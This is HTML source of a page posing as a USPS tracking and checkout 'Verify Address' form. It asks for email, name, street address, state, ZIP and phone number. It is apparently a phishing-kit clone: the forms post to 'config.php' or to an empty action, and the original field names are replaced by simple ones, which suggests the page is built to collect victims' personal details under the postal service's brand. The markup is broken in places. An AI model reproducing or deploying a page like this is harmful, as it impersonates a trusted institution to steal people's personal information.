            <ul aria-hidden="true">
			  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/letters.htm">How to Send a Letter Internationally</a></li>
			  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/preparing-international-shipments.htm">How to Send a Package Internationally</a></li>					  
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/shipping-restrictions.htm">International Shipping Restrictions</a></li>
			  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/international-how-to.htm">Shipping Internationally Online</a></li>			  
			  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/insurance-extra-services.htm">International Insurance &amp; Extra Services</a></li>
			  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/customs-forms.htm">Completing Customs Forms</a></li>
            </ul>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/apo-fpo-dpo.htm?pov=international">Military &amp; Diplomatic Mail</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/money-transfers.htm">Sending Money Abroad</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/passports.htm">Passports</a></li>
          </ul>
          <ul role="menu" aria-hidden="true">
            <h3 class="desktop-only">&nbsp;</h3>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/mail-shipping-services.htm">Comparing International Shipping Services</a></li>  
            <ul aria-hidden="true">
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/gxg.htm">Global Express Guaranteed</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/priority-mail-express-international.htm">Priority Mail Express International</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/priority-mail-international.htm">Priority Mail International</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/first-class-package-international-service.htm">First-Class Package International Service</a></li>
              <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/international/first-class-mail-international.htm">First-Class Mail International</a></li>			  
			  
            </ul>		
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/international-claims.htm">Filing an International Claim</a></li>
            <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/international-refunds.htm">Requesting an International Refund</a></li>			
          </ul>		  
		<form tabindex="-1" role="search" method="POST" action="config.php" class="search global-header--search" >
		<span tabindex="-1" aria-hidden="false" class="input--wrap">
			<label tabindex="-1" class="visuallyhidden" for="global-header--search-track-international">Search USPS.com</label>
			<input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-international" maxlength="256" name="q" type="text">
			<div class="autocorrect"><ul aria-hidden="true"></ul></div>
			<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
		</span>
		</form>
        </div>
      </li>
      <li class="menuheader">
	  	<a tabindex="-1" name="navhelp" id="navhelp" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#navsearch" class="hidden-skip">Skip Help Links</a>
		<a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="https://faq.usps.com/s/">Help</a>
			<div class="repos">
			  <ul role="menu" aria-hidden="true">
				<li><a role="menuitem" tabindex="-1" href="https://faq.usps.com/s/">FAQs</a></li>
				<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/missing-mail.htm">Finding Missing Mail</a></li>
				<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/claims.htm">Filing a Claim</a></li>
				<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/help/refunds.htm">Requesting a Refund</a></li>
			  </ul>
			</div>
      </li>
	  <li class="nav-search menuheader">
	  	<a tabindex="-1" name="navsearch" id="navsearch" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#endnav" class="hidden-skip">Skip Search</a>
		<a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#">Search USPS.com</a>
		<div class="repos">
		<!-- Search -->
		<span aria-hidden="false" class="input--wrap-label">
			<label class="visuallyhidden" for="styleguide-header--search-track">Search USPS.com</label>
		</span>

		<form tabindex="-1" role="search"  class="search global-header--search" method="POST" action="">
			<span tabindex="-1" aria-hidden="false" class="input--wrap">
				<label tabindex="-1" class="visuallyhidden" for="global-header--search-track-search">Search USPS.com</label>
				<input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-search" maxlength="256" name="q" type="text">
				<div class="autocorrect"><ul aria-hidden="true"></ul></div>
				<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
			</span>
		</form>

		<div class="empty-search">
			<p>Top Searches</p>
			<ul aria-hidden="true">
			  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=PO%20Boxes">PO BOXES</a></li>
			  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Passports">PASSPORTS</a></li>
			  <li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Free%20Boxes">FREE BOXES</a></li>
			</ul>
		</div>
		<!-- END Search -->
		</div>
	  </li>

    </ul>
  </nav>
	

	<div class="search--wrapper-hidden" id="search--display">
			<span aria-hidden="false" class="input--wrap-label">
			</span>
		<form role="search"  class="search global-header--search" method="POST" action="">
			<span aria-hidden="false" class="input--wrap">
				<div class="easy-autocomplete search-box">
					<label class="visuallyhidden" for="global-header--search-track-mob-search">Enter Search term for Search USPS.com</label>
					<input autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q fsrVisible global-header--search-track" id="global-header--search-track-mob-search" maxlength="256" name="q" type="text">
					<input value="Search" class="input--search search--submit" type="submit">
				</div>
                    <div class="autocorrect"><ul></ul></div>
			</span>
		</form>

				<div class="empty-search">
					<p>Top Searches</p>
					<ul>
						<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=PO%20Boxes">PO BOXES</a></li>
						<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Passports">PASSPORTS</a></li>
						<li><a role="menuitem" tabindex="-1" href="https://www.usps.com/search/results.htm?PNO=1&amp;keyword=Free%20Boxes">FREE BOXES</a></li>
					</ul>
				</div>
	</div>  
  
	<a name="endnav" id="endnav" href="https://store.usps.com/store/checkout/shippingAddressEdit.jsp?_requestid=&amp;successURL=/store/checkout/shipping.jsp&amp;selectedAddress=Address&amp;nickName=Address#" class="hidden-skip">&nbsp;</a>
</div></div>
    
   


<div class="container-fluid">
	<div class="row">
		<div class="col-12 col-md-12">
			<h1 id="top" class="checkout-title app-title">USPS Tracking
</h1>
				<div id="error" class="error">                                                                             
					 <span role="alert" class="error-message bold"></span>
				</div>
				<div id="atg_store_checkout" class="errorMessage"></div>
				
				 
				
					
					
				

















  










  
    
  
  





  
  




  


  
  
  

  
  
  
  
  
  

  
    
  


  
  
  
  
  
  
  
  
  
  
  
  



		</div>
	</div>
</div>



<!-- START Progress Bar -->
<div class="container-fluid">
	<div class="row">
		<div class="col-12 col-md-12">
			<div class="statusBar text">
				<div class="customer-shipping-information-step active-step"><p><span class="progress-number">1. </span>Customer & Shipping Information</p></div>
				<div class="billing-step"><p>Billing</p></div>
				<div class="review-step"><p>Review</p></div>
				<div class="confirmation-step"><p>Confirmation</p></div>
			</div>
			<div class="statusBar">
				<div class="box box1 active" aria-labelledby="progress bar shipping step"></div>
				<div class="box box2" aria-labelledby="progress bar billing step"></div>
				<div class="box box3" aria-labelledby="progress bar review step"></div>
				<div class="box box4" aria-labelledby="progress bar confirmation step"></div>
			</div>
		</div>
	</div>
</div>
<!-- END Progress Bar -->

      
      





























  
    
  
  




















  




  














  
  
    
    
      
      
             
          
          
          
            
              
            

















  










  
    
  
  





  
  






  

  
  

  





          
        
        
        
        
        
        
          <div id="atg_store_checkout" class="errorMessage"></div>
            

















  










  
    
  
  





  
  




  

  
  
  
  
  
  
  
  
  
  
  
  
    
   <div style="display:none"><input name="_dyncharset" type="hidden" value="UTF-8"> </div><div style="display:none"><input name="_dynSessConf" type="hidden" value="281091852274572378"> </div>

      <input name="/atg/commerce/order/purchase/ShippingGroupFormHandler.cancelURL" type="hidden" value="/store/checkout/shipping.jsp"><input name="_D:/atg/commerce/order/purchase/ShippingGroupFormHandler.cancelURL" type="hidden" value=" ">
  
      

      
      
        <input name="/atg/commerce/order/purchase/ShippingGroupFormHandler.editShippingAddressSuccessURL" type="hidden" value="/store/checkout/shipping.jsp"><input name="_D:/atg/commerce/order/purchase/ShippingGroupFormHandler.editShippingAddressSuccessURL" type="hidden" value=" ">
       

      
      
      
       
           
        
               
          
           
        
      
      
      <input name="/atg/commerce/order/purchase/ShippingGroupFormHandler.editShippingAddressErrorURL" type="hidden" value="/store/checkout/shippingAddressEdit.jsp?successURL=/store/checkout/shipping.jsp&amp;nickName=Address&amp;selectedAddress=Address"><input name="_D:/atg/commerce/order/purchase/ShippingGroupFormHandler.editShippingAddressErrorURL" type="hidden" value=" ">
      <input name="/atg/commerce/order/purchase/ShippingGroupFormHandler.shipToAddressName" type="hidden" value="Address"><input name="_D:/atg/commerce/order/purchase/ShippingGroupFormHandler.shipToAddressName" type="hidden" value=" ">
      <input name="nickname" type="hidden" value="Address"><input name="_D:nickname" type="hidden" value=" ">
      <input name="country" type="hidden" value="US"><input name="_D:country" type="hidden" value=" ">            
      <input name="phoneNumber" type="hidden" value=""><input name="_D:phoneNumber" type="hidden" value=" ">
      <input name="primaryEmail" type="hidden" value=""><input name="_D:primaryEmail" type="hidden" value=" ">       

<!-- START Shipping Address Cart -->
<div class="Shipping_Address_Container">
	<div class="container-fluid">
		<div class="row">
			<div class="col-12 col-md-8 edit-shipping-address-wrapper">
				<div class="row">
					<div class="col-12 col-md-12">
						<h3>Verify Address</h3>
					</div>
				</div>
				<form method="POST" action="">
			 <div class="row">
					<div class="col-12 col-md-12 edit-shipping-address-wrapper">
						<div class="row">
							<div class="col-12 col-md-12 form-group">
								<label>*Email</label><br>
								<input maxlength="42" name="email" id="atg_store_editAddressNickname" type="text"  required="required">
							</div>
						</div> 

	
	


  				<div class="row">
  					<div class="col-12 col-md-12 form-group">
  						<label class="checkbox-component" for="edit-business-checkbox">
  						<input name="edit-business-checkbox" id="edit-business-checkbox" type="checkbox" value="true"><input name="_D:edit-business-checkbox" type="hidden" value=" ">
  						<span class="checkbox"></span>Is this a business contact?</label> 
  					</div>
  				</div>
  				<div class="row">
  					<div class="col-12 col-md-12 form-group edit-business-field" style="display: none;">
  						<label>Company Name</label>
  						<input maxlength="40" name="/atg/commerce/order/purchase/ShippingGroupFormHandler.editAddress.companyName" id="usps_store_companyNameInput" type="text" value="" class="form-control"><input name="_D:/atg/commerce/order/purchase/ShippingGroupFormHandler.editAddress.companyName" type="hidden" value=" ">
  					</div>	
  				</div>
  				<div class="row">						 
  					<div class="col-12 col-md-6 form-group required-field">
  						<label>*First Name</label>
  						<input maxlength="20" name="fname" id="atg_store_firstNameInput" required="required" type="text" value="" class="form-control">
  						<span class="error-message">Please enter first name.</span>
  					</div>						
  					<div class="col-12 col-md-6 form-group required-field">
  						<label>*Last Name</label>
  						<input maxlength="20" name="lname" id="atg_store_lastNameInput" required="required" type="text" value="" class="form-control">
  						<span class="error-message">Please enter last name.</span>
  					</div>
  				</div>
  				<div class="row">						 
  					<div class="col-12 col-md-12 form-group required-field">
  						<label>*Address - Line 1</label>
  						<input maxlength="40" name="address1" id="atg_store_streetAddressInput" required="required" type="text" value="" class="form-control"required="required">
  						<span class="error-message">Please enter address.</span>
  					</div>						
  					<div class="col-12 col-md-12 form-group">
  						<label>Address - Line 2</label>
  						<input maxlength="50" tabindex="0" name="address2" id="atg_store_streetAddressOptionalInput" type="text" value="" class="form-control">
  					</div>
  					<div class="col-12 col-md-12 form-group required-field">
  						<label>*City</label>
  						<input maxlength="40" tabindex="0" name="city" id="atg_store_localityInput" required="required" type="text" value="" class="form-control" required="required">
  						<span class="error-message">Please enter city.</span>
  					</div>						
  				</div>
  
  				    
  				    
  				    
  				    
  				    
  
  
  				<div class="row">
  					<div class="col-12 col-md-8 form-group required-field">
  						<label>*State or Province</label>
  
        
          
            <input type="text" type="hidden" value="" name="sstate" required="required">
              
            
            
            
          
        
      
    
  




            </select>
          
          
        						
  						
  						<span class="error-message">Please select or province.</span>
  					</div>	
  					<div class="col-12 col-md-4 form-group required-field">
  						<label>*ZIP or Postal Code</label>
  						<input maxlength="10" tabindex="0" required="required" name="postalCode" id="atg_store_postalCodeInput" type="text" value="" class="form-control">
  						<span class="error-message">Please enter ZIP or postal code.</span>
  					</div>	
  				</div>
  				<div class="row">
  					<div class="col-12 col-md-12 form-group urbanization-code-field" style="display: none;">
  						<label>Urbanization Code</label>
  						<input maxlength="20" tabindex="0" name="/atg/commerce/order/purchase/ShippingGroupFormHandler.editAddress.urbanCode" id="atg_store_urbanCodeInput" type="text" value="" class="form-control">
  					</div>
  				</div>
  				<div class="row">
  					<div class="col-12 col-md-12 form-group required-field">                         
  						<label>*Country</label>
  						
       
         
             <input name="country" type="hidden" value=" "><select name="country" id="atg_store_countryNameSelect" class="form-control country-dropdown dropdown">
             <option  value="">Select a Country</option>
             




  
  

  
  
    
    
      
      <option value="US" selected="selected">United States</option>
<option value="AF">Afghanistan</option>
    <option value="AX">Aland Islands</option>
    <option value="AL">Albania</option>
    <option value="DZ">Algeria</option>
    <option value="AS">American Samoa</option>
    <option value="AD">Andorra</option>
    <option value="AO">Angola</option>
    <option value="AI">Anguilla</option>
    <option value="AQ">Antarctica</option>
    <option value="AG">Antigua and Barbuda</option>
    <option value="AR">Argentina</option>
    <option value="AM">Armenia</option>
    <option value="AW">Aruba</option>
    <option value="AU">Australia</option>
    <option value="AT">Austria</option>
    <option value="AZ">Azerbaijan</option>
    <option value="BS">Bahamas</option>
    <option value="BH">Bahrain</option>
    <option value="BD">Bangladesh</option>
    <option value="BB">Barbados</option>
    <option value="BY">Belarus</option>
    <option value="BE">Belgium</option>
    <option value="BZ">Belize</option>
    <option value="BJ">Benin</option>
    <option value="BM">Bermuda</option>
    <option value="BT">Bhutan</option>
    <option value="BO">Bolivia</option>
    <option value="BQ">Bonaire, Sint Eustatius and Saba</option>
    <option value="BA">Bosnia and Herzegovina</option>
    <option value="BW">Botswana</option>
    <option value="BV">Bouvet Island</option>
    <option value="BR">Brazil</option>
    <option value="IO">British Indian Ocean Territory</option>
    <option value="BN">Brunei Darussalam</option>
    <option value="BG">Bulgaria</option>
    <option value="BF">Burkina Faso</option>
    <option value="BI">Burundi</option>
    <option value="KH">Cambodia</option>
    <option value="CM">Cameroon</option>
    <option value="CA">Canada</option>
    <option value="CV">Cape Verde</option>
    <option value="KY">Cayman Islands</option>
    <option value="CF">Central African Republic</option>
    <option value="TD">Chad</option>
    <option value="CL">Chile</option>
    <option value="CN">China</option>
    <option value="CX">Christmas Island</option>
    <option value="CC">Cocos (Keeling) Islands</option>
    <option value="CO">Colombia</option>
    <option value="KM">Comoros</option>
    <option value="CG">Congo</option>
    <option value="CD">Congo, Democratic Republic of the Congo</option>
    <option value="CK">Cook Islands</option>
    <option value="CR">Costa Rica</option>
    <option value="CI">Cote D'Ivoire</option>
    <option value="HR">Croatia</option>
    <option value="CU">Cuba</option>
    <option value="CW">Curacao</option>
    <option value="CY">Cyprus</option>
    <option value="CZ">Czech Republic</option>
    <option value="DK">Denmark</option>
    <option value="DJ">Djibouti</option>
    <option value="DM">Dominica</option>
    <option value="DO">Dominican Republic</option>
    <option value="EC">Ecuador</option>
    <option value="EG">Egypt</option>
    <option value="SV">El Salvador</option>
    <option value="GQ">Equatorial Guinea</option>
    <option value="ER">Eritrea</option>
    <option value="EE">Estonia</option>
    <option value="ET">Ethiopia</option>
    <option value="FK">Falkland Islands (Malvinas)</option>
    <option value="FO">Faroe Islands</option>
    <option value="FJ">Fiji</option>
    <option value="FI">Finland</option>
    <option value="FR">France</option>
    <option value="GF">French Guiana</option>
    <option value="PF">French Polynesia</option>
    <option value="TF">French Southern Territories</option>
    <option value="GA">Gabon</option>
    <option value="GM">Gambia</option>
    <option value="GE">Georgia</option>
    <option value="DE">Germany</option>
    <option value="GH">Ghana</option>
    <option value="GI">Gibraltar</option>
    <option value="GR">Greece</option>
    <option value="GL">Greenland</option>
    <option value="GD">Grenada</option>
    <option value="GP">Guadeloupe</option>
    <option value="GU">Guam</option>
    <option value="GT">Guatemala</option>
    <option value="GG">Guernsey</option>
    <option value="GN">Guinea</option>
    <option value="GW">Guinea-Bissau</option>
    <option value="GY">Guyana</option>
    <option value="HT">Haiti</option>
    <option value="HM">Heard Island and Mcdonald Islands</option>
    <option value="VA">Holy See (Vatican City State)</option>
    <option value="HN">Honduras</option>
    <option value="HK">Hong Kong</option>
    <option value="HU">Hungary</option>
    <option value="IS">Iceland</option>
    <option value="IN">India</option>
    <option value="ID">Indonesia</option>
    <option value="IR">Iran, Islamic Republic of</option>
    <option value="IQ">Iraq</option>
    <option value="IE">Ireland</option>
    <option value="IM">Isle of Man</option>
    <option value="IL">Israel</option>
    <option value="IT">Italy</option>
    <option value="JM">Jamaica</option>
    <option value="JP">Japan</option>
    <option value="JE">Jersey</option>
    <option value="JO">Jordan</option>
    <option value="KZ">Kazakhstan</option>
    <option value="KE">Kenya</option>
    <option value="KI">Kiribati</option>
    <option value="KP">Korea, Democratic People's Republic of</option>
    <option value="KR">Korea, Republic of</option>
    <option value="XK">Kosovo</option>
    <option value="KW">Kuwait</option>
    <option value="KG">Kyrgyzstan</option>
    <option value="LA">Lao People's Democratic Republic</option>
    <option value="LV">Latvia</option>
    <option value="LB">Lebanon</option>
    <option value="LS">Lesotho</option>
    <option value="LR">Liberia</option>
    <option value="LY">Libyan Arab Jamahiriya</option>
    <option value="LI">Liechtenstein</option>
    <option value="LT">Lithuania</option>
    <option value="LU">Luxembourg</option>
    <option value="MO">Macao</option>
    <option value="MK">Macedonia, the Former Yugoslav Republic of</option>
    <option value="MG">Madagascar</option>
    <option value="MW">Malawi</option>
    <option value="MY">Malaysia</option>
    <option value="MV">Maldives</option>
    <option value="ML">Mali</option>
    <option value="MT">Malta</option>
    <option value="MH">Marshall Islands</option>
    <option value="MQ">Martinique</option>
    <option value="MR">Mauritania</option>
    <option value="MU">Mauritius</option>
    <option value="YT">Mayotte</option>
    <option value="MX">Mexico</option>
    <option value="FM">Micronesia, Federated States of</option>
    <option value="MD">Moldova, Republic of</option>
    <option value="MC">Monaco</option>
    <option value="MN">Mongolia</option>
    <option value="ME">Montenegro</option>
    <option value="MS">Montserrat</option>
    <option value="MA">Morocco</option>
    <option value="MZ">Mozambique</option>
    <option value="MM">Myanmar</option>
    <option value="NA">Namibia</option>
    <option value="NR">Nauru</option>
    <option value="NP">Nepal</option>
    <option value="NL">Netherlands</option>
    <option value="AN">Netherlands Antilles</option>
    <option value="NC">New Caledonia</option>
    <option value="NZ">New Zealand</option>
    <option value="NI">Nicaragua</option>
    <option value="NE">Niger</option>
    <option value="NG">Nigeria</option>
    <option value="NU">Niue</option>
    <option value="NF">Norfolk Island</option>
    <option value="MP">Northern Mariana Islands</option>
    <option value="NO">Norway</option>
    <option value="OM">Oman</option>
    <option value="PK">Pakistan</option>
    <option value="PW">Palau</option>
    <option value="PS">Palestinian Territory, Occupied</option>
    <option value="PA">Panama</option>
    <option value="PG">Papua New Guinea</option>
    <option value="PY">Paraguay</option>
    <option value="PE">Peru</option>
    <option value="PH">Philippines</option>
    <option value="PN">Pitcairn</option>
    <option value="PL">Poland</option>
    <option value="PT">Portugal</option>
    <option value="PR">Puerto Rico</option>
    <option value="QA">Qatar</option>
    <option value="RE">Reunion</option>
    <option value="RO">Romania</option>
    <option value="RU">Russian Federation</option>
    <option value="RW">Rwanda</option>
    <option value="BL">Saint Barthelemy</option>
    <option value="SH">Saint Helena</option>
    <option value="KN">Saint Kitts and Nevis</option>
    <option value="LC">Saint Lucia</option>
    <option value="MF">Saint Martin</option>
    <option value="PM">Saint Pierre and Miquelon</option>
    <option value="VC">Saint Vincent and the Grenadines</option>
    <option value="WS">Samoa</option>
    <option value="SM">San Marino</option>
    <option value="ST">Sao Tome and Principe</option>
    <option value="SA">Saudi Arabia</option>
    <option value="SN">Senegal</option>
    <option value="RS">Serbia</option>
    <option value="CS">Serbia and Montenegro</option>
    <option value="SC">Seychelles</option>
    <option value="SL">Sierra Leone</option>
    <option value="SG">Singapore</option>
    <option value="SX">Sint Maarten</option>
    <option value="SK">Slovakia</option>
    <option value="SI">Slovenia</option>
    <option value="SB">Solomon Islands</option>
    <option value="SO">Somalia</option>
    <option value="ZA">South Africa</option>
    <option value="GS">South Georgia and the South Sandwich Islands</option>
    <option value="SS">South Sudan</option>
    <option value="ES">Spain</option>
    <option value="LK">Sri Lanka</option>
    <option value="SD">Sudan</option>
    <option value="SR">Suriname</option>
    <option value="SJ">Svalbard and Jan Mayen</option>
    <option value="SZ">Swaziland</option>
    <option value="SE">Sweden</option>
    <option value="CH">Switzerland</option>
    <option value="SY">Syrian Arab Republic</option>
    <option value="TW">Taiwan, Province of China</option>
    <option value="TJ">Tajikistan</option>
    <option value="TZ">Tanzania, United Republic of</option>
    <option value="TH">Thailand</option>
    <option value="TL">Timor-Leste</option>
    <option value="TG">Togo</option>
    <option value="TK">Tokelau</option>
    <option value="TO">Tonga</option>
    <option value="TT">Trinidad and Tobago</option>
    <option value="TN">Tunisia</option>
    <option value="TR">Turkey</option>
    <option value="TM">Turkmenistan</option>
    <option value="TC">Turks and Caicos Islands</option>
    <option value="TV">Tuvalu</option>
    <option value="UG">Uganda</option>
    <option value="UA">Ukraine</option>
    <option value="AE">United Arab Emirates</option>
    <option value="GB">United Kingdom</option>
    <option value="UM">United States Minor Outlying Islands</option>
    <option value="UY">Uruguay</option>
    <option value="UZ">Uzbekistan</option>
    <option value="VU">Vanuatu</option>
    <option value="VE">Venezuela</option>
    <option value="VN">Viet Nam</option>
    <option value="VG">Virgin Islands, British</option>
    <option value="VI">Virgin Islands, U.s.</option>
    <option value="WF">Wallis and Futuna</option>
    <option value="EH">Western Sahara</option>
    <option value="YE">Yemen</option>
    <option value="ZM">Zambia</option>
    <option value="ZW">Zimbabwe</option>
    

    
      <script type="text/javascript">
        var selstateText = 'Select a State';
        var postState = '';        
        var state = '';
      
      
        
        
          
          
        
          
          
            
            
            
            
                              
                
                
                state = state+'US:AL:AL - Alabama|';
                              
                
                
                state = state+'US:AK:AK - Alaska|';
                              
                
                
                state = state+'US:AS:AS - American Samoa|';
                              
                
                
                state = state+'US:AZ:AZ - Arizona|';
                              
                
                
                state = state+'US:AR:AR - Arkansas|';
                              
                
                
                state = state+'US:CA:CA - California|';
                              
                
                
                state = state+'US:CO:CO - Colorado|';
                              
                
                
                state = state+'US:CT:CT - Connecticut|';
                              
                
                
                state = state+'US:DE:DE - Delaware|';
                              
                
                
                state = state+'US:DC:DC - District of Columbia|';
                              
                
                
                state = state+'US:FM:FM - Federated States of Micronesia|';
                              
                
                
                state = state+'US:FL:FL - Florida|';
                              
                
                
                state = state+'US:GA:GA - Georgia|';
                              
                
                
                state = state+'US:GU:GU - Guam|';
                              
                
                
                state = state+'US:HI:HI - Hawaii|';
                              
                
                
                state = state+'US:ID:ID - Idaho|';
                              
                
                
                state = state+'US:IL:IL - Illinois|';
                              
                
                
                state = state+'US:IN:IN - Indiana|';
                              
                
                
                state = state+'US:IA:IA - Iowa|';
                              
                
                
                state = state+'US:KS:KS - Kansas|';
                              
                
                
                state = state+'US:KY:KY - Kentucky|';
                              
                
                
                state = state+'US:LA:LA - Louisiana|';
                              
                
                
                state = state+'US:ME:ME - Maine|';
                              
                
                
                state = state+'US:MH:MH - Marshall Islands|';
                              
                
                
                state = state+'US:MD:MD - Maryland|';
                              
                
                
                state = state+'US:MA:MA - Massachusetts|';
                              
                
                
                state = state+'US:MI:MI - Michigan|';
                              
                
                
                state = state+'US:MN:MN - Minnesota|';
                              
                
                
                state = state+'US:MS:MS - Mississippi|';
                              
                
                
                state = state+'US:MO:MO - Missouri|';
                              
                
                
                state = state+'US:MT:MT - Montana|';
                              
                
                
                state = state+'US:NE:NE - Nebraska|';
                              
                
                
                state = state+'US:NV:NV - Nevada|';
                              
                
                
                state = state+'US:NH:NH - New Hampshire|';
                              
                
                
                state = state+'US:NJ:NJ - New Jersey|';
                              
                
                
                state = state+'US:NM:NM - New Mexico|';
                              
                
                
                state = state+'US:NY:NY - New York|';
                              
                
                
                state = state+'US:NC:NC - North Carolina|';
                              
                
                
                state = state+'US:ND:ND - North Dakota|';
                              
                
                
                state = state+'US:MP:MP - Northern Mariana Islands|';
                              
                
                
                state = state+'US:OH:OH - Ohio|';
                              
                
                
                state = state+'US:OK:OK - Oklahoma|';
                              
                
                
                state = state+'US:OR:OR - Oregon|';
                              
                
                
                state = state+'US:PW:PW - Palau|';
                              
                
                
                state = state+'US:PA:PA - Pennsylvania|';
                              
                
                
                state = state+'US:PR:PR - Puerto Rico|';
                              
                
                
                state = state+'US:RI:RI - Rhode Island|';
                              
                
                
                state = state+'US:SC:SC - South Carolina|';
                              
                
                
                state = state+'US:SD:SD - South Dakota|';
                              
                
                
                state = state+'US:TN:TN - Tennessee|';
                              
                
                
                state = state+'US:TX:TX - Texas|';
                              
                
                
                state = state+'US:UT:UT - Utah|';
                              
                
                
                state = state+'US:VT:VT - Vermont|';
                              
                
                
                state = state+'US:VA:VA - Virginia|';
                              
                
                
                state = state+'US:VI:VI - Virgin Islands|';
                              
                
                
                state = state+'US:WA:WA - Washington|';
                              
                
                
                state = state+'US:WV:WV - West Virginia|';
                              
                
                
                state = state+'US:WI:WI - Wisconsin|';
                              
                
                
                state = state+'US:WY:WY - Wyoming|';
                              
                
                
                state = state+'US:AA:AA - Armed Forces Americas|';
                              
                
                
                state = state+'US:AE:AE - Armed Forces Africa|';
                              
                
                
                state = state+'US:AA:AA - Armed Forces Americas|';
                              
                
                
                state = state+'US:AE:AE - Armed Forces Canada|';
                              
                
                
                state = state+'US:AE:AE - Armed Forces Europe|';
                              
                
                
                state = state+'US:AE:AE - Armed Forces Middle East|';
                              
                
                
                state = state+'US:AP:AP - Armed Forces Pacific|';
              
              
              
            
          
        
      
      //end state string
        function TrimString(sInString) {
          if ( sInString ) {
            sInString = sInString.replace( /^\s+/g, "" );// strip leading
            return sInString.replace( /\s+$/g, "" );// strip trailing
          }
        }

        function populateState(countryObj) {

          displayMandatoryState(countryObj.value);
          var selObj = document.getElementById("atg_store_stateSelect");
          var selectedIndex = selObj.selectedIndex;
          var postState = '';          
          if (selectedIndex != -1){
            postState = selObj.options[selObj.selectedIndex].value;
          }          
          var foundState = false;
          //alert(state);
          //alert('selObj' + eval(selObj));
          //alert('selObj.type:' + selObj.type);
          // Empty options just in case new drop down is shorter
          if (selObj.type == 'select-one' ) {
            //alert('true');
            //alert('selObj.options.length"' + selObj.options.length);
            for (var i = 0; i < selObj.options.length; i++) {
              selObj.options[i] = null;
            }
            selObj.options.length=null;
            selObj.options[0] = new Option(selstateText,'');
            selObj.selectedIndex = 0;
          }
          // Populate the drop down with states from the selected country
          var stateLineArray = state.split("|");  // Split into lines
          var optionCntr = 1;
        //alert('stateLineArray.length:' + stateLineArray.length);
          for (var loop = 0; loop < stateLineArray.length; loop++) {
            lineArray = stateLineArray[loop].split(":");
            countryCode  = TrimString(lineArray[0]);
            stateCode    = TrimString(lineArray[1]);
            stateName    = TrimString(lineArray[2]);
            //alert('countryCode:'+ countryCode + ';stateCode:' + stateCode + ';stateName:'+stateName);
            if (countryObj.value == countryCode && countryCode != '' || countryObj.value == '') {
              if ( stateCode != undefined && stateCode != '' ) {
                selObj.options[optionCntr] = new Option(stateName, stateCode);
              }
              // See if it's selected from a previous post
              if ( stateCode == postState) {
                selObj.selectedIndex = optionCntr;
              }
              foundState = true;
              optionCntr++;
            }
          }
        }

        function displayMandatoryState(country) {
         var countryList = new Array();
          var displayMandatory='false';
          
                   
                  
                    
                    countryList[0]='US';
                    
                  
  
          for(var count=0; count<countryList.length;count++) {
            //alert(TrimString(country)==TrimString(countryList[count]));
            if(TrimString(country)==TrimString(countryList[count])) {
              displayMandatory='true';
              break;
            }
          }

        }
        displayMandatoryState('US');                        
      </script>
    
  



           </select>
         
         
       
  						<span class="error-message">Please select country.</span>
  					</div>
  				</div>
  				<div class="row">
  					<div class="col-12 col-md-6 form-group required-field">
  						<label>*Phone</label>
  						<input maxlength="15" tabindex="0" name="phoneNumber" id="atg_store_telephoneInput" type="text" value="" class="form-control" required="required">
  						<span class="error-message">Please enter phone number.</span>
  					</div>						
  					
  				</div>





                         
                      
                     
                 
              
	  
	        
	
	
  
	<div class="row">
		
		
		<div class="col-12 col-md-12 buttons-holder">
			<div class="button-container">
            <button  id="okbb" name="okbb" role="button" type="submit" class="btn-primary check-availability1" tabindex="0">Continue</a>

                <input name="_D:/atg/commerce/order/purchase/ShippingGroupFormHandler.editShippingAddress" type="hidden" value=" ">
				<input onclick="dojo.query(&#39;#shipToNewAddress&#39;).attr(&#39;value&#39;,&#39;false&#39;);" name="/atg/commerce/order/purchase/ShippingGroupFormHandler.editShippingAddress" style="display:none" id="saveAndReturnToShipping" type="submit" value=""><input name="_D:/atg/commerce/order/purchase/ShippingGroupFormHandler.editShippingAddress" type="hidden" value=" ">    
			</div>
